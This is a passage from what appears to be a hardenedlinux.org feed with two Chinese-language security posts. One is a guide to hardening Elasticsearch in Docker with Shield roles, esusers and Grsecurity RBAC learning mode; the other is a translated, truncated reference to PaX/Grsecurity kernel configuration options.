    &lt;p&gt;Privileges：代表一组用户在ElasticSearch中允许执行的行为。例如：是否能运行query就是一种Privileges。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Permissions：一组结合一个或多个“安全对象（Secured Object）”的Privileges。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;在ElasticSearch中有两种Secured Object：
&amp;gt;Cluster：Cluster permissions提供了集群范围内的管理、侦听权限。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;blockquote&gt;
    &lt;p&gt;Index：Index permissions提供了数据通道，包括在集群中特定索引的管理和侦听。&lt;/p&gt;
  &lt;/blockquote&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;roles：一组命名的Permission的组合。例如：你可以定义一个“日志管理员”的role，他允许对名字为“logs-*”的索引做任何操作，但对其他文件却没有任何权限。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;Note:作为ES的管理员，你需要定义一些角色，并将每个用户分配到这些角色上。&lt;/em&gt;&lt;/p&gt;

&lt;h5 id=&quot;roles&quot;&gt;2) 定义roles&lt;/h5&gt;

&lt;p&gt;Roles在ES_HOME/config/shield中的roles.yml文件中定义，其中的每个条目都定义了唯一一个role和相应的permission。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note：roles.yml文件在每个节点中独立管理。所以在拥有多个节点的集群中，所有节点的该文件都需要修改。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;roles.yml文件的格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# All cluster rights
# All operations on all indices
admin:
  cluster: all
  indices:
    '*': all

# Monitoring cluster privileges
# All operations on all indices
power_user:
  cluster: monitor
  indices:
    '*': all

# Only read operations on indices named events_*
events_user:
  indices:
    'events_*': read
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;具体的Privileges请参见：&lt;a href=&quot;http://&quot;&gt;https://www.elastic.co/guide/en/shield/current/reference.html#ref-actions-list&lt;/a&gt;&lt;/p&gt;

&lt;h5 id=&quot;esusers&quot;&gt;3） 使用esusers工具管理用户&lt;/h5&gt;

&lt;p&gt;esusers工具主要控制在ES_HOME/config/shield/的两个文件————users和users_roles。这两个文件存储着所有esuser域的信息，并且会在ES启动时被shield读取。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note：roles.yml文件在每个节点中独立管理。所以在拥有多个节点的集群中，所有节点的该文件都需要修改。&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;users文件：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;users文件储存着所有用户和他们的密码。每个条目是每个用户的名字和密码的hash值。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;users_roles文件：&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;users_roles存储的是每个用户相联系的roles&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h6 id=&quot;a&quot;&gt;A、添加用户&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers useradd &amp;lt;username&amp;gt;
esusers useradd &amp;lt;username&amp;gt; -r &amp;lt;comma-separated list of role names&amp;gt; 使用-r参数定义用户的roles，roles间用逗号隔开
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ES在启动时会读取用户和角色信息，应该使用开启ES的用户使用useradd添加用户。&lt;/p&gt;

&lt;h6 id=&quot;b&quot;&gt;B、打印用户信息&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers list
esusers list &amp;lt;username&amp;gt; 这个命令打印指定用户信息
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;c&quot;&gt;C、修改用户密码&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers passwd &amp;lt;username&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;d&quot;&gt;D、分配用户角色&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers roles &amp;lt;username&amp;gt; -a &amp;lt;roles&amp;gt; -r &amp;lt;roles&amp;gt;
-a指定添加，-r指定移除
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&quot;e&quot;&gt;E、删除用户&lt;/h6&gt;

&lt;pre&gt;&lt;code&gt;esusers userdel &amp;lt;username&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;rbac-1&quot;&gt;RBAC加固实践&lt;/h4&gt;

&lt;p&gt;1） 修改roles.yml文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;cd /usr/es/elasticsearch-1.7.0/config/shield
vim roles.yml
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在文件的末尾加入如下内容：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Data_user: #Data_user 角色定义
  indices:  #index部分
    '*': crub  #指定Data_user可以读写所有indices

Server_user:  #Serve_user 角色定义
  cluster: cluster:admin/nodes/restart, cluster:admin/nodes/shutdown
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2） 添加两个用户user_Data和user_Server&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;esusers useradd user_data -r Data_user
esusers useradd user_server -r Server_user
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这时，用不同的用户登陆ES将可以进行不同的操作：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;user_data：读写ES的所有文件&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;user_server:启动或关闭ES服务&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;rbac-2&quot;&gt;5、完善物理机RBAC系统，达到最小权限要求&lt;/h2&gt;

&lt;h3 id=&quot;section-3&quot;&gt;知识准备&lt;/h3&gt;

&lt;p&gt;之前讲解了ElasticSearch上的RBAC系统的配置。在Grsecurity中也提供了RBAC权限控制系统，而且比ES中的划分更细致更严格。&lt;/p&gt;

&lt;p&gt;管理物理机中的系统主要依靠gradm工具。使用&lt;code&gt;gradm --help&lt;/code&gt;获得gradm的用法：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# gradm --help
gradm 3.1
grsecurity RBAC administration and policy analysis utility

Usage: gradm [option] ... 

Examples:
        gradm -P
        gradm -F -L /etc/grsec/learning.logs -O /etc/grsec/policy
Options:
        -E, --enable    Enable the grsecurity RBAC system
        -D, --disable   Disable the grsecurity RBAC system
        ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/etc/grsec/policy文件是RBAC系统的核心。在RBAC启动后，它会根据该文件中所写定的策略对系统进行严格的访问控制。&lt;/p&gt;

&lt;h4 id=&quot;policyrole-subject-object&quot;&gt;policy中的三个概念role, subject, object&lt;/h4&gt;

&lt;p&gt;同Shield的RBAC相似，Grsecurity的RBAC也具有三个关于角色和权限的概念。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;role（角色）：如“role admin sA“，“role default ”，”role root uG“，表明有三个角色，分别是admin , default, root&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Roles: Users and groups on the system
在policy中声明即可以定义角色，语法为”role &amp;lt; role name&amp;gt; &amp;lt; parameter&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;grsecurity中的角色分为用户角色，组角色，缺省角色（default），还有个管理员角色。定义不同角色需要有不同的参数。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;NOTE：grsecurity的角色与用户是一对一的。假设有tester用户，属于test组，那么tester用户登录后，会先在policy文件中匹配名为tester用户角色，如果没有，就会去匹配叫test的组角色，如果还没有，那么tester用户进入系统后的角色会是default（default角色在配置文件里面定义）。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;也就是说，tester用户登录后，不是tester用户角色，就是test组角色，要么就是default缺省角色，不可能进入其他policy中定义的角色。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;subject（程序），每个subject中首先定义了一个可执行程序（注意，一个subject中只定义一个可执行程序，要对多个可执行程序进行定义的话，就需要多个subject），或者更准确一点，定义了一个运行在系统中的进程。然后后面跟着一系列的object，用来规定当前这个进程的权限。每个角色定义的后面都可以跟一个或多个subject&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Subjects: Processes and directories
参数：
&amp;gt;h 这个进程是隐藏的，只能够被具有v模式的进程看到；
v 具有这个模式的进程拥有察看隐藏进程的能力；
p 进程是受保护的，这种模式的进程只能被具有k模式的进程杀死；
k 具有这个模式的进程可以杀死处于保护模式（p）的进程；
l 为这个进程打开学习模式；
o 撤销ACL继承&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;object（对象）：每个subject中都会有若干的object，表示每个进程都有若干个操作对象，这些操作对象一般来说都是一些目录，文件等等，用来规定当前这个subject中的进程对这些文件拥有哪些权限&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;Objects: Files and PaX flags
参数：
&amp;gt;r 这个对象可以打开阅读；
  w 这个对象可以打开写或者添加；
  o 这个对象可以打开添加；
  h 这个对象是隐藏的；
  i 这个模式只用于二进制可执行文件。当这个对象被执行时，它继承所在主体进程的访问控制列表；
  x: 这个模式代表文件可执行&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;NOTE：配置文件中关于subject和object的所有路径都必须是绝对路径&lt;/strong&gt;&lt;/p&gt;

&lt;h4 id=&quot;section-4&quot;&gt;例：&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;role root uG
subject /
subject /usr/bin/ssh
/etc/ssh/ssh_config r
表示/usr/bin/ssh这个进程对/etc/ssh/ssh_config这个文件有读权限（r）。更进一步讲，这个subject位于角色root后面，所以这两行策略的含义就是以root角色运行ssh时，ssh进程对/etc/ssh/ssh_config有读权限。该策略只定义在了root角色中，对于其他角色不起作用。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;缺省ACL&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;注意：在每一个角色中，都必须有一个subject /，表示一个缺省的ACL，如果没有这个缺省的ACL，grsecurity启动时会报错同时启动失败。当以一个角色登录系统后，如果要执行的可执行程序没有被某个subject定义，那么，该程序就会采用subject /中的缺省定义。例如root角色，没有对cat命令进行定义，所以以root角色执行cat命令时，ACL系统就会参照subject /中的定义来控制cat进程对文件的访问。
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;rbac-3&quot;&gt;部署RBAC系统&lt;/h3&gt;

&lt;p&gt;Grsecurity的policy文件极其繁大复杂，通过手工几乎不可能完成一个具有安全效力的规则文件。所幸Grsecurity为RBAC系统提供了学习机制，即可以通过你在学习机制下进行的操作自动配置policy文件。&lt;/p&gt;

&lt;p&gt;Grsecurity的学习模式分为全系统学习模式跟基于角色的学习模式，在这里我们使用全系统学习模式:&lt;/p&gt;

&lt;p&gt;1） 开启全系统学习模式&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sudo gradm -F -L /etc/grsec/learning.logs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;http://ww3.sinaimg.cn/large/d8c6c741jw1evsx0lb4fij20pn02u0ta.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如图所示，RBAC学习模式开启成功。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;从现在开始，gradm将记录下你的一切操作。&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;NOTE：&lt;/em&gt;初次启动时RBAC可能会报出一些ERROR，原因是默认的policy文件没有配置完全：如图，该ERROR为未给shutdown用户设置密码。按照提示执行&lt;code&gt;gradm -P shutdown&lt;/code&gt;并设置密码即可。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/d8c6c741jw1evswtm71ylj20q904gmxv.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2) 进行一些系统运行时正常的必要的操作，并重复至少4遍，以使gradm将操作记录下来&lt;/p&gt;

&lt;p&gt;&lt;em&gt;NOTE：不要在学习模式下进行进行管理员操作，如果需要此类操作，先切换到RBAC管理员角色：&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gradm -a admin
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;在高危操作结束后，记得从管理员角色退出：&lt;code&gt;gradm -u&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3） 以针对ElasticSearch业务的加固为例，对RBAC进行配置：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;业务分析：&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;在docker中的ES内设置两个用户，一个只允许对其中数据进行读写操作，一个只允许在docker内部重启ES服务；这一步已在前文Shield的加固中实现。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在docker外设置一个本地用户，其除了拥有对本地系统的管理权限之外，还应对运行着ES业务的docker拥有启停等操作的权限；但不应拥有进入docker内部的权限。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在全系统学习模式下，对普通用户执行如下命令：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;启动docker:
sudo service docker start
sudo weave launch
sudo weave start 10.0.0.1/24 oaDataNode1
sudo weave start 10.0.0.2/24 oaDataNode2
sudo weave start 10.0.0.3/24 oaDataNode3
sudo weave start 10.0.0.4/24 oaDataNode4
sudo weave expose 10.0.0.254/24

关闭docker：
sudo weave stop
sudo docker stop oaDataNode2 oaDataNode1 oaDataNode3 oaDataNode4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;重复执行至少4遍。&lt;/p&gt;

&lt;p&gt;4）关闭RBAC&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gradm -D
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这一步是必要的，因为它强制将学习模式的缓存写入磁盘。如果没有关闭gradm就生成policy，可能会导致学习记录的丢失。&lt;/p&gt;

&lt;p&gt;此时查看learning.logs会看见里面有很多命令。&lt;/p&gt;

&lt;p&gt;4） 生成policy文件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;gradm -F -L /etc/grsec/learning.logs -O /etc/grsec/policy
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;NOTE：执行该命令前应该确保学习模式已经记录了足够多安全的操作，否则再次启动RBAC时将导致无法管理系统。&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;section-5&quot;&gt;结语&lt;/h1&gt;

&lt;p&gt;该文档通过使用Grsecurity和Shield对系统及ES进行了一系列的加固，虽然所做的所有措施只针对与ES有关的业务，但也能大体描绘出一个最小权限系统加固的轮廓。在其他不同的环境下依然能够按照这个思路对系统进行安全加固。&lt;/p&gt;

&lt;p&gt;Grsecurity和Shield都是无比强大的加固武器，通过STIG检测的系统更是拥有更高的安全性。文档只是粗勒地描绘出一套加固思路，更多安全措施请参考Grsecurity和Shield的官方文档。&lt;/p&gt;

&lt;h1 id=&quot;todo&quot;&gt;TODO&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;内核调参数，主要针对TCP/IP性能（针对DoS）和安全的一系列参数需要调整，场景化的情况下根据一款具体的硬件配置来进行调参。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Iptables/netfilter规则，这个可以根据具体的业务场景来定制。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;（重点）安装部署的一个STIG-compliance的系统，效果是在安装步骤完成后，stig-4-debian自动扫描出的结果应该全部或者大部分通过。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;PaX/Grsec的config可以细化，这个未来我们会把针对不同场景的config归档。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Grsec的RBAC规则使用learning mode只是把规则抓出来，和AppArmor的aa-genprof/aa-logprof类似，加固的原则是针对的RBAC/MAC规则都必须经过review，这一步工作也需要加强。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;reference&quot;&gt;Reference&lt;/h1&gt;

&lt;p&gt;1） Grsecurity官方文档：&lt;a href=&quot;http://&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options#Address_Space_Layout_Randomization&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2） gradm官方文档：&lt;a href=&quot;http://&quot;&gt;https://en.wikibooks.org/wiki/Grsecurity/The_Administration_Utility&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3） Shield官方文档：&lt;a href=&quot;http://&quot;&gt;https://www.elastic.co/guide/en/shield/current/index.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4） hardenedlinux社区：&lt;a href=&quot;http://&quot;&gt;http://hardenedlinux.org/&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 06 Sep 2015 22:42:00 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/09/06/hardening-es-in-docker-with-grsec.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/09/06/hardening-es-in-docker-with-grsec.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
      <item>
        <title>PaX/Grsecurity配置选项</title>
        <description>&lt;p&gt;By: CipherGateway&lt;/p&gt;

&lt;p&gt;Wiki网址：https://en.wikibooks.org/wiki/Grsecurity/Appendix/Grsecurity_and_PaX_Configuration_Options&lt;/p&gt;

&lt;h1 id=&quot;grsecurity&quot;&gt;Grsecurity配置选项&lt;/h1&gt;

&lt;p&gt;[TOC]&lt;/p&gt;

&lt;h2 id=&quot;configuration-method&quot;&gt;Configuration Method（配置选项）&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Automatic(自动配置)&lt;/strong&gt; 【使用此选项，你只需回答一些你希望如何配置内核的问题，Grsecurity和Pax将自动以此标准并按照最通用化完成配置。如果你还想定制其他标准，custom configuration自定义选项的选择同样会生效&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Custom（自定义配置）&lt;/strong&gt;【你将完全手动定制Grsecurity和Pax】&lt;/p&gt;

&lt;h4 id=&quot;usage-type&quot;&gt;Usage Type（内核用途）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Server&lt;/strong&gt; 【如果你打算将此作为一个服务器的内核】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Desktop&lt;/strong&gt; 【如果你打算将此作为一个桌面操作系统的内核】&lt;/p&gt;

&lt;h4 id=&quot;virtyalization-type&quot;&gt;Virtyalization Type（虚拟化技术类型）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; 【内核将运行在纯物理机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Guest&lt;/strong&gt; 【内核将被运行在虚拟机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Host&lt;/strong&gt; 【内核将被运行在宿主机上】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;(X) EPT/RVI Processor Support&lt;/strong&gt; 【Choose this option if your CPU supports the EPT or RVI features of 2nd-gen hardware virtualization.This allows for additional kernel hardening protections to operate without additional performance impact.
To see if your Intel processor supports EPT, see: http://ark.intel.com/Products/VirtualizationTechnology (Most Core i3/5/7 support EPT)
To see if your AMD processor supports RVI, see: http://support.amd.com/us/kbarticles/Pages/GPU120AMDRVICPUsHyperVWin8.aspx】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;–&amp;gt;( ) First-gen/No Hardware Virtualization&lt;/strong&gt; 【Choose this option if you use an Atom/Pentium/Core 2 processor that either doesn’t support hardware virtualization or doesn’t support the EPT/RVI extensions.】&lt;/p&gt;

&lt;h4 id=&quot;virtualization-software&quot;&gt;Virtualization Software&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Xen&lt;/strong&gt; 【（GRKERNSEC_CONFIG_VIRT_XEN）Choose this option if this kernel is running as a Xen guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VMWare&lt;/strong&gt; 【Choose this option if this kernel is running as a VMWare guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;KVM&lt;/strong&gt; 【Choose this option if this kernel is running as a KVM guest or host.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;VirtualBox&lt;/strong&gt; 【Choose this option if this kernel is running as a VirtualBox guest or host.】&lt;/p&gt;

&lt;h4 id=&quot;required-priorities-performance&quot;&gt;Required Priorities (Performance)（优先级需求）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Performance（性能优先）&lt;/strong&gt; 【选取这个选项将导致以下特性无法使用：UDEREF on a 64bit kernel, kernel stack clearing,clearing of structures intended for userland, and freed memory sanitizing】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Security（安全优先）&lt;/strong&gt; 【以上特性可用，但在最糟糕的情况下这些特性将导致20%的性能损耗】&lt;/p&gt;

&lt;h4 id=&quot;default-special-groups&quot;&gt;Default Special Groups（特殊组）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;(1001) GID exempted(被免除) from /proc restrictions&lt;/strong&gt;
【通过设定这个GID来决定那个组中的用户能够免除/proc目录下Grsecurity规则的限制，允许特殊组的用户查看网络数据、和其他用户的运行信息。这个GID也可以在开机时在内核命令行中通过“grsec_proc_gid=”设置】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1005) GID for TPE-untrusted users(TPE:Tursted Path Execution）&lt;/strong&gt; 【该组的用户将会受到TPE的限制。如果sysctl可用，sysctl中一个名为“tpe_gid”选项将会产生】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;(1006) GID for users with kernel-enforced&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&quot;customize-configuration&quot;&gt;Customize Configuration（自定义配置）&lt;/h2&gt;

&lt;h3 id=&quot;pax&quot;&gt;PaX&lt;/h3&gt;

&lt;h4 id=&quot;enable-various-pax-features&quot;&gt;Enable various PaX features&lt;/h4&gt;

&lt;p&gt;【Pax为内核提供了防止入侵机制，从而降低了可利用的内存漏洞造成的风险】&lt;/p&gt;

&lt;h4 id=&quot;pax-control&quot;&gt;PaX Control&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Support soft mode&lt;/strong&gt; 【（PAX_SOFTMODE）允许通过soft mode运行Pax，内核并不默认执行PaX保护功能,可以在运行时开启或关闭。。你必须同时启用PT_PAX_FLAGS或XATTR_PAX_FLAGS支持，因为只有它们能在soft mode下标记可运行程序。	soft mode可以使用“pax_softmode=1”参数通过内核命令行在开机时激活。	此外，在运行时你可以通过/proc/sys/kernel/pax的项目控制各种Pax特性。】【Non-SOFTMODE: The kernel enforces PaX protections by default for all features.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use legacy ELF header marking&lt;/strong&gt; 【（PAX_EI_PAX）启用这个选项将允许你通过“chpax”工具（可在http://pax.grsecurity.net 获得）控制每一个可执行程序的Pax特性。控制信息可以在otherwise reserved 的部分ELF头部（其他情况保存的部分ELF头部？？）读取。这个标记有大量的弊端（没有对soft-mode的支持、工具链不知道ELF头部的不规范用法），因此这个特性相比于PT_PAX_FLAGS and XATTR_PAX_FLAGS已经过时.		要注意的是如果你启用PT_PAX_FLAGS or XATTR_PAX_FLAG标记支持，它们会覆盖传统的EI_PAX标记。		If you enable none of the marking options then all applications will run with PaX enabled on them by default.（仅是没有PT_PAX_FLAGS or XATTR_PAX_FLAG标记支持吗？？）】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use ELF program header marking&lt;/strong&gt; 【（PAX_PT_PAX_FLAGS）启用这个选项将允许你通过“paxctl”工具（可在http://pax.grsecurity.net 获得）控制每一个可执行程序的Pax特性。控制信息可以从一个Pax特定的ELF程序头部读取。这个标记有同时支持soft-mode和完全整合toolchain。		要注意如果你同时启用了传统的EI_PAX标记支持，EI_PAX标记将被PT_PAX_FLAGS覆盖。		如果你同时启动了PT_PAX_FLAGS and XATTR_PAX_FLAGS支持，你应该确保被标记的二进制文件的标志是相同的。		If you enable none of the marking options then all applications will run with PaX enabled on them by default.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use filesystem extended attributes（EA） marking（使用文件系统的扩展属性）&lt;/strong&gt; 【（PAX_XATTR_PAX_FLAGS）启用这个选项将允许你通过“setfattr”工具控制每一个可执行程序的Pax特性。控制信息可以从文件的扩展属性user.pax.flags读取（将Pax flags保存在EA中，从而不会修改ELF程序）。这个标记的好处是：支持可以自检的binary-only applications（如skype）并且不能兼容chpax/paxctl的改变。】【该特性主要的缺点是因为一些文件系统（如isofs, udf, vfat)不支持扩展属性，导致通过这类文件系统拷贝文件时将失去扩展属性和Pax标记。		要注意如果你同时启用了传统的EI_PAX标记支持，EI_PAX标记将被XATTR_PAX_FLAGS覆盖。	如果你同时启动了PT_PAX_FLAGS and XATTR_PAX_FLAGS支持，你应该确保被标记的二进制文件的标志是相同的。	If you enable none of the marking options then all applications will run with PaX enabled on them by default.】&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;==（//可通过cat /proc/’PID’/status&lt;/td&gt;
      &lt;td&gt;grep PaX来查看进程的Pax flags）==&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&quot;mac-system-integrationmacmandatory-access-control-&quot;&gt;MAC system integration（集合）（MAC，Mandatory Access Control 强制访问控制）&lt;/h4&gt;

&lt;p&gt;【MAC系统具有控制每个可执行程序Pax标志的选项。选择你特定的系统支持的方法。		NOTE: this option is for developers/integrators only.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;none&lt;/strong&gt; 【（PAX_NO_ACL_FLAGS）如果MAC系统与Pax没有联系】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;direct&lt;/strong&gt; 【（PAX_HAVE_ACL_FLAGS）如果MAC系统自行定义pax_set_initial_flags参数】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;hook&lt;/strong&gt; 【（PAX_HOOK_ACL_FLAGS）如果MAC系统使用pax_set_initial_flags_func的回调】&lt;/p&gt;

&lt;h4 id=&quot;non-executable-pages&quot;&gt;Non-executable pages（不可执行页：只允许读和写，而代码执行是被禁止的）&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Enforce non-executable pages&lt;/strong&gt; 【(PAX_NOEXEC)勾选这个选项你将可以选择众多防止注入和外来代码的特性。但将使依赖原始方法（RWX权限系统???）和通过malloc()方法族动态分配内存的程序无法使用。如： XFree86 4.x server, the java runtime and wine.】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Paging based non-executable pages&lt;/strong&gt; 【（PAX_PAGEEXEC）这个特性基于CPU的页特性。在没有硬件不可执行位支持的i386CPU里它是可变的，但通常带有较低的性能损耗。然而在基于Intel’s P4核心的CPU性能损耗将非常高，所有此类情况你应该禁止这个选项。对于拥有硬件不可执行位支持的CPU：alpha, avr32, ia64, parisc, sparc, sparc64, x86_64 and i386，这个特性没有性能损耗,在ppc下损耗可以忽略不计。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Emulate trampolines (模仿GCC扩展（回调？？？））&lt;/strong&gt; 【（PAX_EMUTRAMP）总有一些程序和库因为一些原因或意图去执行在禁止执行内存页中的特殊代码段，大量有名的例子是内核自己生成的信号句柄回调代码（kernel signal handler return code）和GCC trampolines。  如果你开启了CONFIG_PAX_PAGEEXEC这个特性这些进程将不能再运行。  作为补救，你可以启用这个选项并通过chpax、paxctl工具来为那些仍受到non-executable pages的保护的受影响的程序启用trampoline emulation。  在工作站(On parisc)你必须开启这个选项和EMUSIGRT，否则你的系统将无法启动！】【另外的，你可以在这里选否，并使用chpax或paxctl工具为受影响的文件禁用CONFIG_PAX_PAGEEXEC and CONFIG_PAX_SEGMEXEC特性。】【开启这个特性可能会从non-executable pages的保护中打开一个漏洞。因此最好的解决方法是不使用任何请求这个选项的文件。这可以通过不使用libc5（因为它依赖kernel signal handler return code）和不使用或重写通过GCC实现的嵌套函数的程序。  有经验的使用者可以直接修改GCC使嵌套函数不干扰Pax。】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Restrict mprotect()（限制mprotect()）&lt;/strong&gt; 【(PAX_MPROTECT)启用这个特性将阻止进程进行以下操作：1、改变未被初始化为可执行的内存页的可执行状态；2、使只读的可执行页可再次写入；3、在分配的内存中创建可执行页；4、让重定位后只读的（RELRO）数据页可再次写入】【你应该启用这个特性来完善non-executable pages提供的强制保护措施.  Note:你可以使用chpax或paxctl来控制每个可执行程序的这个属性】&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Use legacy/compat protection demoting (read help)（使用传统/可兼容的安全措施（如RWX权限？）降低pax安全作用的影响）&lt;/strong&gt; 【（PAX_MPROTECT_COMPAT）现在的PAX_MPROTECT实现机制通过发送适当的错误代码给应用程序来阻止RWX权限分配。对于一些broken userland，Python或其他应用可能会造成问题。The current implementation however allows for applications like clamav to detect if JIT compilation/execution is allowed and to fall back gracefully to an interpreter-based mode if it does not.  While we encourage everyone to use the current implementation as-is and push upstream to fix broken userland (note that the RWX logging option can assist with this), in some environments this may not be possible. Having to disable 